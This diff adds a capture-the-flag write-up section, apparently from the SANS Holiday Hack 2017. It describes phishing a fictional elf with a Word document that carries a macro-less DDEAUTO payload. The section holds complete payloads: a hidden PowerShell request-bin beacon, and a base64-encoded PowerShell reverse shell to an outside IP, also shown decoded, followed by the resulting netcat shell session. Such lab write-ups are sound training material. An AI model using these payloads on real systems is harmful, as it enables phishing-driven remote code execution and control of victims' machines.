@@ -540,3 +540,198 @@ http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf
 
 From the book we learn about the lollipop guild, trying to (allegedly) ruin Christmas. Sha1: `f192a884f68af24ae55d9d9ad4adf8d3a3995258` 
 
+
+
+# 7) Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?
+
+Looking through the rest of Alabaster's emails from task 4, we find some hints pointing us towards
+a word exploit:
+
+```
+Quit worrying Minty,
+
+You have nothing to worry about with me around! I have developed most of 
+the applications in our network including our network defenses. We are 
+are completely secure and impenetrable.
+
+Sincerely,
+
+Alabaster Snowball.
+
+
+On 11/15/2017 2:41 PM, minty.candycane@northpolechristmastown.com wrote:
+> Hey Alabaster,
+>
+> You know I'm a novice security enthusiast, well I saw an article a 
+> while ago about regarding DDE exploits that dont need macros for MS 
+> word to get command execution.
+>
+> https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
+>
+> Should we be worried about this?
+>
+> I tried it on my local machine and was able to transfer a file. Here's 
+> a poc:
+>
+> http://mail.northpolechristmastown.com/attachments/dde_exmaple_minty_candycane.png 
+>
+>
+> I know your the resident computer engineer here so I wanted to defer 
+> to the expert.
+>
+> :)
+>
+> -Minty CandyCane.
+>
+```
+
+In addition, we also see that Alabaster himself might be the perfect target
+for such an exploit:
+
+```
+Ewww, raisin. I loved the gingerbread cookies myself. I think that Mrs 
+Claus gave me the recipe. If I find it, ill send it to you in an email. 
+I believe it was a a MS Word docx file. So keep an eye out for an email 
+containing the words "gingerbread" "cookie" "recipe" and a link or 
+attachment to the .docx file.
+
+
+On 11/15/2017 1:16 PM, pepper.minstix@northpolechristmastown.com wrote:
+> I liked the raisin ones myself. Dont know about the gingerbread ones.
+>
+>
+> On 11/15/2017 1:14 PM, sparkle.redberry@northpolechristmastown.com wrote:
+>> Me neither, sorry.
+>>
+>>
+>> On 11/15/2017 1:13 PM, mary.sugerplum@northpolechristmastown.com wrote:
+>>> Sorry, I dont know that recipe or have any left.
+>>>
+>>>
+>>> On 11/15/2017 1:10 PM, alabaster.snowball@northpolechristmastown.com 
+>>> wrote:
+>>>> Does anyone have any cookies left over from Mrs Claus cookie stock 
+>>>> pile from last year? I'm working on the computer non-stop until 
+>>>> Christmas doing development and desperately need some of her north 
+>>>> pole famous gingerbread cookies to keep me going.
+>>>>
+>>>> I already emailed her but for she is not in the North Pole.
+>>>>
+>>>> I NEEEEED MOAR COOKIES!
+>>>>
+>>>> -Alabaster Snowball
+>>>>
+>>>
+>>
+>
+```
+
+We are also given some information about Alabaster's system. namely that
+he runs windows, powershell and also has nc.exe installed and available
+on the path:
+
+```
+On 12/12/2017 2:20 PM, alabaster.snowball@northpolechristmastown.com wrote:
+
+I installed nc.exe to path for my computer.
+
+
+On 12/5/2017 2:33 PM, alabaster.snowball@northpolechristmastown.com wrote:
+> Well powershell is my new love but netcat will always hold a special 
+> place in my heart.
+>
+>
+> On 12/5/2017 2:32 PM, minty.candycane@northpolechristmastown.com wrote:
+>> You still use netcat on your windows box?
+```
+
+So naturally, we give exploiting Alabaster computer a try. Following the
+[blog post](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/) 
+found in one of the emails we produce a .docx with the following payload:
+
+```
+{ DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('https://requestb.in/yayv0hya')" }
+```
+
+The payload simply sends a request to a request bin that we have set up so that we can
+verify whether the exploit works or not. Turns out that it does, a couple of seconds
+after sending an email to Alabaster (with "gingerbread cookie recipe" as subject and
+the .docx as attachment), we do get a request to our request bin!
+
+![requestbin request](task7/exploit_test_request.png)
+
+With the basic exploit working it should be fairly easy to change it to open a reverse
+shell via nc.exe, which Alabaster is supposed to have installed and on his path. However,
+this turns out not to be the case. For some reason or the other using nc.exe did not seem
+to work. We do know he is runnig powershell though (as evident from our "test exploit" above),
+which means there are multiple other ways for us to gain access other than nc.exe.
+
+A quick google later, we end up at [Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1).
+All we have to do now is modifying the script so that it targets the correct ip/port. To
+get it to actually run we also had to include the payload directly in the wordfile.
+Trying to fetch the script and then running it did not yield any results. To avoid any
+shell interpretations we pass our payload as a base64 encoded string via the powershell 
+`-e` parameter. The result is the following word field value:
+
+```
+{ DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADYALgAxADAALgAxADMAMQAuADIANQAiACwAMwAwADAAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" }
+```
+
+Where the long base64 encoded blob decodes to the following command:
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("176.10.131.25",3000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+After setting up netcat locally to listen for the connection, we send the email to
+alabaster.snowball@northpolechristmastown.com with our new .docx exploit attached.
+And again we make sure to specify "gingerbread cookie recipe" as the subject to get
+Alabaster to open the file.
+
+It doesn't take long until we have a shell on Alabaster's computer:
+
+```
+peter@peter-VirtualBox:~$ nc -lv 3000
+
+Connection from [10.0.2.2] port 3000 [tcp/*] accepted (family 2, sport 51101)
+ls
+
+
+    Directory: C:\Users\alabaster_snowball\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       12/23/2017   4:17 AM              0 file.txt                                                              
+-a----       12/23/2017   2:00 PM              0 out.txt                                                               
+
+
+PS C:\Users\alabaster_snowball> cd c:\
+PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       11/14/2017   7:57 PM                inetpub                                                               
+d-----        9/12/2016  11:35 AM                Logs                                                                  
+d-----        12/5/2017   5:00 PM                Microsoft                                                             
+d-----        7/16/2016   1:23 PM                PerfLogs                                                              
+d-r---       11/15/2017   2:35 PM                Program Files                                                         
+d-----       11/14/2017   8:24 PM                Program Files (x86)                                                   
+d-----       11/15/2017   3:03 PM                python                                                                
+d-r---       11/14/2017   8:39 PM                Users                                                                 
+d-----       11/30/2017   6:23 PM                Windows                                                               
+-a----        12/4/2017   8:42 PM        1053508 GreatBookPage7.pdf                                                    
+
+
+PS C:\> Get-FileHash GreatBookPage7.pdf -Algorithm SHA1
+
+Algorithm       Hash                                                                   Path                            
+---------       ----                                                                   ----                            
+SHA1            C1DF4DBC96A58B48A9F235A1CA89352F865AF8B8                               C:\GreatBookPage7.pdf 
+```
+
+The great book describes the witches of Oz.
